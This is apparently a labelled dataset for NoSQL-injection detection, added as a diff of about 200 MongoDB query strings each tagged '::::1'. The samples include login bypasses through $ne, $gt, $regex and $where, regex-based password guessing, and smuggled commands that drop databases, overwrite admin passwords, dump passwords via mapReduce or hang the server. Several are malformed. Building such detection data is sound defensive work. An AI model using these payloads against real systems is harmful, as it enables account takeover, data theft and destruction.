@@ -1,0 +1,203 @@
+db.collection('users').findOne({""username"": {""$ne"": null}, ""password"": {""$ne"": null}})::::1
+db.Document.find({ "type": { "$gte": "" } })::::1
+db.Document.find({ "type": { "$ne: 0 "" } })::::1
+db.logins.find({ username: { $ne: 1 }, password: { $ne: 1 } })::::1
+db.doc.find({ username: 'tolkien', $or: [ {}, { 'a': 'a', password: '' } ], $comment: 'successful MongoDB injection' })::::1
+db.members.find({login:"admin", pass: {$ne: "parol1"} } )::::1
+db.foo.find( { $or : [ { a : 1 } , { b : 2 }, { c : /.*/ } ] } )::::1
+db.collection.find( { '$where' : 'function() { return artist == "Weezer"; }}' )::::1
+db.collection.find ( '$where' : 'function() {var len = artist.length;for (int i=2; i<len; i++) {if (len % I == 0) return false;}return true; }')::::1
+db.mycol.find({$or:[{"by":{"$ne": null}},{"title": "MongoDB Overview"}]}).pretty()::::1
+db.students.find({ $or:[{""by"":{""$ne"": null}}, {grades: { $elemMatch: { mean: { $gt: 70 }, grade: { $gt:90 } } } }]}, { ""grades.$"": 1 } )"::::1
+db.collection('users').findOne({ "username": {"$ne": null},"password": {"$ne": null}})::::1
+db.mycol.find({$or:[{"by":{"$ne": null}},{"title": "MongoDB Overview"}]})::::1
+db.students.find({ $or:[{"by":{"$ne": null}}, {grades: { $elemMatch: { mean: { $gt: 70 }, grade: { $gt:90 }} } }]}, { "grades.$": 1 } )::::1
+db.users.find({"username": {"$gt": ""},"password": {"$gt": ""})::::1
+db.restaurant.updateMany({"username": {"$ne": null},,{ $set: { "Review" : true } })::::1
+var query = { $where: "this.canceledOrders > " + req.body.canceledOrders } db.collection('users').find(query).each(function(err, doc) { console.log(doc); })::::1
+db.articles.find({"$where": "this.hidden == false && this.category == ' '; return '' == ' ' })::::1
+db.users.find({username:'dummy'});return{username:tojson(db.getName()),password:2}}//,password:'dummy'})::::1
+db.users.find({username:'dummy'});return{username:tojson(db.getCollectionName()),password:2}}//',password:dummy})::::1
+db.users.save({msg: '1';sleep(10000);var%20foo='bar'})::::1
+db.users.save({msg:1';var%20d%20=%20new%20Date();%20var%20cd%20=%20null;%20do%20{%20cd%20=%20new%20Date();%20}%20while(cd-d%20<%2010000);var%20foo='bar})::::1
+db.library.find({ISBN: '0763754891' || '1' =='1' })::::1
+db.collection.find({$where: 'orders' > '';return true;var foo='bar'}::::1
+db.collection.find({$where: 'orders' > '0;while(true);var foo='bar'}::::1
+db.admins.find({user: 'rafid', $or:[{},{a: 'a',$and: [passcode: '',validation_key: '']}, $comment: 'haha' ]})::::1
+db.library.find({by: 'George R. R. Martin',title: 'Game of Thrones'});db.runCommand('db.dropDatabase()');({'var foo='bar'})::::1
+db.users.find({username: 'rafid'});db.users.findAndModify({ query: { username:'rafid'}, update:{$set:{'a:a', password: 'dragonball'}},$comment: 'successful MongoDB injection'})::::1
+db.logins.find({ username: { $ne: 0 }, password: { $ne: 0 } })::::1
+db.logins.find({ username: { $gt: 0 }, password: { $gt: "" } })::::1
+db.logins.find({ username: { $gte: "" }, password: { $gte: "" } })::::1
+db.logins.find({ username: { $lt: "zzzzzzzzzzzzzzzzzzzzzzzzzz" }, password: { $lt: "zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz" } })::::1
+db.logins.find({ username: { $lte: "zzzzzzzzzzzzzzzzzzzzzzzzzz" }, password: { $lte: "zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz" } })::::1
+db.logins.find({ username: { $nin: [0] }, password: { $nin: [0] } })::::1
+db.collection('users').findOne({ "username": "dummy", $or: [ {}, { password: "" } ]})::::1
+db.collection('users').findOne({ "username": "admin", "Password" : {$or: [ {}, "abcd" ] }})::::1
+db.collection('users').findOne({"username": "admin", "Password" : {$and: [{1==1}] }})::::1
+db.collection('users').find({ "username": {$exists: true}, "Password" : {$exists: true}})::::1
+db.collection('users').find({"username": {$not: ""}, "Password" : {$not: ""}})::::1
+db.collection('users').find({ "username": {$not: null},"Password" : {$not: null}})::::1
+db.collection('users').find({"username": {$nor: [{0==1}, {1==2}]},"Password" : {$nor: [{0==1},{1==2}]}})::::1
+db.collection.find({$where: name == ''; return '' == ''})::::1
+db.collection('users').find({"username": {$type: "string"},"Password" : {$type: "string"}})::::1
+db.collections.find({$where: quantity > '';sleep(50000);;var foo='bar'})::::1
+db.collection.find({$where: name == '';return(db.getCollectionNames().length == 2);var foo='bar')}::::1
+db.users.find({username: 'dummy'});db.users.drop();db.users.insert({username:'rafid', password:'rafid'})::::1
+db.users.find({name: 'rafid'});db.users.remove(.*);db.users.insert({ name: 'dummy'})::::1
+db.users.find({name: 'dummy', $where: 1==1}, { name: '1', password: '1'})::::1
+db.users.find({username: 'dummy'});return{something:1,something:2}}//', password: 'dummy'})::::1
+db.users.find({username: /.*/, password: /.*/})::::1
+db.users.find({username: {$nin: [/./]}, password: {$nin: [/./]}})::::1
+db.users.find({username: {$in: [/.*/]}, password: {$in: [/.*/]}})::::1
+db.users.find({Username: {$in:[/.a*]}, password: {$nin:[/./]}})::::1
+db.users.find({Username: { $regex: /.*/i }password: { $regex: /.*/i }})::::1
+db.users.find({Username: { $regex: /^a/ }password: { $regex: /.*/ }})::::1
+db.users.find({"username": "admin", "password": {"$gt": ""}})::::1
+db.users.find({"username": "admin"});//,"password": {"$gt": ""}})::::1
+db.users.find({"username": "admin", "password": "abcd" || 1==1})::::1
+db.users.find({"username": "admin" || 1==1, "password": {"$ne": ""}})::::1
+db.users.find({"username": "admin"; return true;//, "password": {"$ne": ""}})::::1
+db.users.find({"username": "admin"});db.user.insert(["username"=>"user","password"=>"12345678"])//, "password": {"$ne": ""}})::::1
+db.users.find({"username": "admin"});db.users.update({username:"admin"},{username:"admin",password:"12345678"},{ upsert: true })//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.users.deleteOne({username:"admin"})//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.users.deleteMany({username:"admin"})//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.users.drop()//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.users.remove(username:"admin")//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.user.insertOne(["username"=>"user","password"=>"12345678"])//, "password": {"$ne": ""}})::::1
+db.users.find({"username": "admin"; return 1;//, "password": {"$ne": ""}})::::1
+db.users.find({"username": "admin"; return 1==1;//, "password": {"$ne": ""}})::::1
+db.users.find({"username": "admin"});db.users.updateOne({username:"admin"},{$set : {password:"12345678"}},{ upsert: true })//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.users.updateMany({username:"admin"},{$set : {password:"12345678"}},{ upsert: true })//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.users.replaceOne({username:"admin"},{username:"admin", password:"12345678"},{ upsert: true })//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.users.findOneAndDelete({username:"admin"})//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.users.findOneAndReplace({username:"admin"},{username:"admin", password:"12345678"})//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.users.findOneAndUpdate({username:"admin"},{username:"admin", password:"12345678"})//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.users.save({username:"newUser", password:"12345678"})//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.users.renameCollection("record")//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.users.bulkWrite( [{ insertOne : { "document" :{"username":"newUser", "password":"12345678"} } }])//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.users.bulkWrite( [{ updateOne : { "filter" :{"username":"admin"} , "update" : {"username":"newUser", "password":"12345678"}} }])//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.users.bulkWrite( [{ updateMany: { "filter" :{"username":"admin"} , "update" : {"username":"newUser", "password":"12345678"}} }])//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.users.bulkWrite( [{ replaceOne : { "filter" :{"username":"admin"} , "replacement" : {"username":"newUser", "password":"12345678"}} }])//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.users.bulkWrite( [{ deleteOne : { "filter" :{"username":"admin"} } }])//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.users.bulkWrite( [{ deleteMany : { "filter" :{"username":"admin"} } }])//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.users.copyTo(newUser)//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.users.distinct( "username" )//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.cloneCollection('mongodb.example.net:27017', 'users.profile')//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.cloneDatabase("hostname")//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.copyDatabase('records', 'archive_records')//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.createCollection("user")//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.shutdownServer()//", "password": "abcd"})::::1
+db.users.find({"username": "admin", $where: "1==1"})//", "password": "abcd"})::::1
+db.users.find({"username": "admin", "password": "abcd", $where: "1==1"})::::1
+db.users.find({"username": "admin", $where: function(){return true}})//", "password": "abcd"})::::1
+db.users.find({"username": "admin", $where: function(){return 1}})//", "password": "abcd"})::::1
+db.users.find({"username": "admin", $where: "this.password != "" "})//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});sleep(10000);//", "password": "abcd"})::::1
+db.users.find({"username": "admin", "password": "abcd"});sleep(10000);//"})::::1
+db.users.find({"username": "admin"}); while(true){};//", "password": "abcd"})::::1
+db.users.find({"username": "admin", "password": {$or: [{}, "123456789"]}})::::1
+db.users.find({"username": {$or: [{}, "admin"]}, "password": {$or: [{}, "123456789"]}})::::1
+db.myCollection.find( { $where: "this.credits == this.debits || 1==1" } );::::1
+db.myCollection.find( { $where: "this.credits == this.debits || this.credits != ''" } );::::1
+db.users.find({username: "admin", password: /.*/})::::1
+db.users.find({username: "admin", password: {$nin: [/./]}})::::1
+db.users.find({username: "admin", password: {$in: [/.*/]}})::::1
+db.users.find({Username: "admin", password: {$nin:[/./]}})::::1
+db.users.find({Username: "admin", password: { $regex: /.*/i }})::::1
+db.users.find({Username: "admin", password: { $regex: /.*/ }})::::1
+db.users.find({username: "admin", password: /^x/})::::1
+db.users.find({username: "admin", password: {$nin: [/^x/]}})::::1
+db.users.find({username: "admin", password: {$in: [/^x/]}})::::1
+db.users.find({Username: "admin", password: {$nin: [/^x/]}})::::1
+db.users.find({Username: "admin", password: { $regex: [/^x/i] }})::::1
+db.users.find({Username: "admin", password: { $regex: [/^x/] }})::::1
+db.users.find({Username: "admin", password: { $regex: [/^x/m] }})::::1
+db.users.find({Username: "admin", password: { $regex: [/^x/x] }})::::1
+db.users.find({Username: "admin", password: { $regex: [/^x/s] }})::::1
+db.users.find({Username: "admin", password: { $regex: [/^xyz/] }})::::1
+db.users.find({Username: "admin", password: { $regex: [/^aa/] }})::::1
+db.users.find({Username: "admin", password: { $regex: [/^a.*z/] }})::::1
+db.users.find({Username: "admin", password: { $regex: [/^a.*$/] }})::::1
+db.users.find({Username: "admin", password: { $regex: '^a' }})::::1
+db.users.find({Username: "admin", password: { $regex: '^abc' }})::::1
+db.users.find({Username: "admin", password: { $regex: '^a', $option: 'i'}})::::1
+db.users.find({Username: "admin", password: { $regex: '^abc', $option: 'm'}})::::1
+db.users.find({Username: "admin", password: { $regex: '^xyz', $option: 'x'}})::::1
+db.users.find({Username: "admin", password: { $regex: '^a.*', $option: 's'}})::::1
+db.users.find({Username: "admin", password: { $regex: /^a.*$/, $option: 'i'}})::::1
+db.users.find({Username: "admin", password: { $regex: /^xy$/, $option: 's'}})::::1
+db.users.find({Username: "admin", password: { $regex: /^abc/, $option: 'x'}})::::1
+db.users.find({Username: "admin", password: { $regex: /^xyz/, $option: 'm'}})::::1
+db.users.find({Username: "admin", password: { $regex: /^ABC/, $option: 'i'}})::::1
+db.users.find({ username: {"$ne": ""}, password: {$regex: /.*/} })::::1
+db.users.find({ username: {"$not": ""}, password: {$regex: /.*/} })::::1
+db.users.find({ username: {"$gt": ""}, password: {$regex: /.*/} })::::1
+db.users.find({ username: {"$gte": ""}, password: {$regex: /.*/} })::::1
+db.users.find({ username: {"$ne": null}, password: {$regex: /.*/} })::::1
+db.users.find({ username: {"$nin": []}, password: {$regex: /.*/} })::::1
+db.users.find({ username: {"$nin": [""]}, password: {$regex: /.*/} })::::1
+db.users.find({ username: {"$ne": ""}, password: {$regex: '.*'} })::::1
+db.users.find({ username: {"$not": ""}, password: {$regex: '.*'} })::::1
+db.users.find({ username: {"$gt": ""}, password: {$regex: '.*'} })::::1
+db.users.find({ username: {"$gte": ""}, password: {$regex: '.*'} })::::1
+db.users.find({ username: {"$ne": null}, password: {$regex: '.*'} })::::1
+db.users.find({ username: {"$nin": []}, password: {$regex: '.*'} })::::1
+db.users.find({ username: {"$nin": [""]}, password: {$regex: '.*'} })::::1
+db.users.find({ username: {"$ne": ""}, password: {$regex: /^abc/} })::::1
+db.users.find({ username: {"$not": ""}, password: {$regex: /^abc/} })::::1
+db.users.find({ username: {"$gt": ""}, password: {$regex: /^abc/} })::::1
+db.users.find({ username: {"$gte": ""}, password: {$regex: /^abc/} })::::1
+db.users.find({ username: {"$ne": null}, password: {$regex: /^abc/} })::::1
+db.users.find({ username: {"$nin": []}, password: {$regex: /^abc/} })::::1
+db.users.find({ username: {"$nin": [""]}, password: {$regex: /^abc/} })::::1
+db.users.find({ username: {"$ne": ""}, password: {$regex: /^ABC/i} })::::1
+db.users.find({ username: {"$not": ""}, password: {$regex: /^ABC/i} })::::1
+db.users.find({ username: {"$gt": ""}, password: {$regex: /^ABC/i} })::::1
+db.users.find({ username: {"$gte": ""}, password: {$regex: /^ABC/i} })::::1
+db.users.find({ username: {"$ne": null}, password: {$regex: /^ABC/i} })::::1
+db.users.find({ username: {"$nin": []}, password: {$regex: /^ABC/i} })::::1
+db.users.find({ username: {"$nin": [""]}, password: {$regex: /^ABC/i} })::::1
+db.users.find({"username": "admin"});db.dropDatabase()//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.fsyncLock()//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.getCollection("auth")//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.getCollectionInfos()//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.getCollectionNames()//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.getName()//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.getSiblingDB('users')//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.hostInfo()//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.isMaster()//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.killOp()//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.loadServerScripts()//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.logout()//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.printReplicationInfo()//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.printShardingStatus()//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.printSlaveReplicationInfo()//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.serverBuildInfo()//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.serverCmdLineOpts()//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.serverStatus()//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.setLogLevel(1)//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.setLogLevel(2, "storage.journal" )//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.stats()//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.stats(1024)//", "password": "abcd"})::::1
+db.users.mapReduce( function() { emit(this.name, this.password); }, function(name, password) { return password; }, { out: "map_reduce_example" } )//, 1); }, function(name, count) { return Array.sum(totalCount); }, { out: "map_reduce_example" } )::::1
+db.users.mapReduce( function() { emit(this.name, this.password); }, function(name, password) { return password; }, { out: "map_reduce_example", query: {this.name: {"$ne": 0}} } )//, 1); }, function(name, count) { return Array.sum(totalCount); }, { out: "map_reduce_example" } )::::1
+db.users.mapReduce( function() { emit(this.name, this.password); }, function(name, password) { return password; }, { out: "map_reduce_example", query: {this.name: {"$gt": ""}} } )//, 1); }, function(name, count) { return Array.sum(totalCount); }, { out: "map_reduce_example" } )::::1
+db.users.mapReduce( function() { emit(this.name, this.password); }, function(name, password) { return password; }, { out: "map_reduce_example", query: {this.name: {"$not": ""}} } )//, 1); }, function(name, count) { return Array.sum(totalCount); }, { out: "map_reduce_example" } )::::1
+db.users.mapReduce( function() { emit(this.name, this.password); }, function(name, password) { return password; }, { out: "map_reduce_example", query: {this.name: {"$gt": ""}}, sort: {this.name: 1} } )//, 1); }, function(name, count) { return Array.sum(totalCount); }, { out: "map_reduce_example" } )::::1
+db.users.mapReduce( function() { emit(this.name, this.password); }, function(name, password) { return password; }, { out: "map_reduce_example", query: {this.name: {"$gt": ""}}, limit: 10 } )//, 1); }, function(name, count) { return Array.sum(totalCount); }, { out: "map_reduce_example" } )::::1
+db.orders.mapReduce( function() { emit(this.cust_id, this.name); }, function(keyCustId, name) { return name; }, { out: "map_reduce_example" } )//this.price); }, function(keyCustId, valuesPrices) { return Array.sum(valuesPrices); }, { out: "map_reduce_example" } )::::1
+db.orders.mapReduce( function() { emit(this.cust_id, this.name); }, function(keyCustId, name) { return name; }, { out: "map_reduce_example", query: {this.name: {"$gt": ""}} } )//this.price); }, function(keyCustId, valuesPrices) { return Array.sum(valuesPrices); }, { out: "map_reduce_example" } )::::1
+db.orders.mapReduce( function() { emit(this.cust_id, this.name); }, function(keyCustId, name) { return name; }, { out: "map_reduce_example", query: {this.name: {"$not": ""}} } )//this.price); }, function(keyCustId, valuesPrices) { return Array.sum(valuesPrices); }, { out: "map_reduce_example" } )::::1
+db.orders.mapReduce( function() { emit(this.cust_id, this.name); }, function(keyCustId, name) { return name; }, { out: "map_reduce_example", query: {this.name: {"$ne": ""}} } )//this.price); }, function(keyCustId, valuesPrices) { return Array.sum(valuesPrices); }, { out: "map_reduce_example" } )::::1
+db.orders.mapReduce( function() { emit(this.cust_id, this.name); }, function(keyCustId, name) { return name; }, { out: "map_reduce_example", query: {this.name: {"$gte": ""}} } )//this.price); }, function(keyCustId, valuesPrices) { return Array.sum(valuesPrices); }, { out: "map_reduce_example" } )::::1
+db.orders.mapReduce( function() { emit(this.cust_id, this.name); }, function(keyCustId, name) { return name; }, { out: "map_reduce_example", query: {this.name: {"$gt": ""}}, limit: 5 } )//this.price); }, function(keyCustId, valuesPrices) { return Array.sum(valuesPrices); }, { out: "map_reduce_example" } )::::1
+db.orders.mapReduce( function() { emit(this.cust_id, this.name); }, function(keyCustId, name) { return name; }, { out: "map_reduce_example", query: {this.name: {"$gt": ""}}, sort: {this.name: 1} } )//this.price); }, function(keyCustId, valuesPrices) { return Array.sum(valuesPrices); }, { out: "map_reduce_example" } )::::1
+db.posts.mapReduce( function() { emit(this.user_id,this.phoneno); }, function(key, values) {return  phoneno}, { query:{status:"active"}, out:"user_phone" })//1); }, function(key, values) {return  Array.sum(values)}, { query:{status:"active"}, out:"post_total" })::::1
+db.posts.mapReduce( function() { emit(this.user_id,this.phoneno); }, function(key, values) {return  phoneno}, { out:"user_phone" })//1); }, function(key, values) {return  Array.sum(values)}, { query:{status:"active"}, out:"post_total" })::::1
+db.posts.mapReduce( function() { emit(this.user_id,this.phoneno); }, function(key, values) {return  phoneno}, { limit: 20, out:"user_phone" })//1); }, function(key, values) {return  Array.sum(values)}, { query:{status:"active"}, out:"post_total" })::::1
+db.posts.mapReduce( function() { emit(this.user_id,this.phoneno); }, function(key, values) {return  phoneno}, { sort: {this.user_id: 1}, out:"user_phone" })//1); }, function(key, values) {return  Array.sum(values)}, { query:{status:"active"}, out:"post_total" })::::1
+db.doc.find({ username: ‘tolkien’, $or: [ {}, { ‘a’: ‘a’, password: ‘’ } ]})//’})::::1
+db.collection.find( { user: ‘harris’, $or : [ { a : 1 } , { b : /.*/ } ] } )//’::::1
+db.collection.find( { user: ‘tomas’, $or : [ { a : 1 } , { b : {$regex: /.*/ }} ] } )//’::::1
+db.admins.find({user:  ‘rafid’, $or:[{},{a: ‘a’,$and: [passcode: ‘’,validation_key: ‘’]}//’ ]})::::1
